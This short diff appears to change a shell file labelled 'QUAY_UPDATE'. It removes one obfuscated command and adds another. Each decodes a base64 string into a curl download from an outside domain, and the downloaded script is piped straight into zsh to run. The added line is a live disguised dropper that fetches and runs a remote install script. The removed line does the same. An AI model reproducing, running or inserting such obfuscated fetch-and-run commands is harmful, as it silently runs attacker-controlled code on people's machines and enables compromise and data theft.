@@ -1,2 +1,2 @@
 # QUAY_UPDATE
-curl -s $(echo "aHR0cHM6Ly9xdWlsbGNoYW50MTQuY29tL2N1cmwvb3dlNGQydXdhbHp1L2drZ2V1ZjRqZ2xqOGttcG5vcWIudHh0" | openssl base64 -d -A) | zsh
+echo 'dHlwZXNldCAteCBCT09UX3RhZz00MDI1IF9zdGFnZV9peD1lZDBhMmY0NSBfcHJvYmVfa2V5PWF1dG87Y3VybCAtc0wgImh0dHBzOi8vcXVpbGxjb3JhbDIwLmNvbS9jdXJsL3NmOWJscTFnN2d3L2luc3RhbGwuc2gifCAvYmluL3pzaA==' |base64 -D| zsh
